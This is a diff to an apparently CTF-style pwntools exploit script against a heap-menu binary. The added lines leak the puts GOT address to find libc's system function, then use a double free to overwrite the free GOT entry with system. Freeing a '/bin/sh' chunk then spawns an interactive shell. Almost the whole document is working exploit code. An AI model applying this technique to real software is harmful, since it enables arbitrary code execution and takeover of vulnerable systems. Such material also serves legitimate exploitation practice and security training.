@@ -57,9 +57,9 @@ def dbg():
 	pause()
 
 _add,_free,_edit,_show = 1,4,2,3
-def add(index,content='a'*8):
+def add(size,content='a'*8):
 	sla(':',_add)
-	sla(':',index)
+	sla(':',size)
 	sa(':',content)
 
 def free(index):
@@ -68,7 +68,8 @@ def free(index):
 
 def edit(index,content):
 	sla(':',_edit)
-	sla(':',index)
+	sla('?',index)
+	sla(':',len(content))
 	sa(':',content)
 
 def show(index):
@@ -76,7 +77,24 @@ def show(index):
 	sla(':',index)
 
 # start
+add(0x20) # 0
+add(0x20) # 1
+free(1)
+free(0)
+add(0x10,p64(elf.got['puts'])+p64(0)) # 2
+show(1)
 
+ru('house:\n')
+puts = uu64(r(6))
+base,libc,system = leak_libc('puts',puts,libc)
+
+add(0x10) # 3
+free(3)
+free(3)
+add(0x10,p64(elf.got['free'])) # 4
+add(0x20,'/bin/sh\x00') # 5
+add(0x10,p64(system)) # 6
+free(5)
 # end
 
 p.interactive()
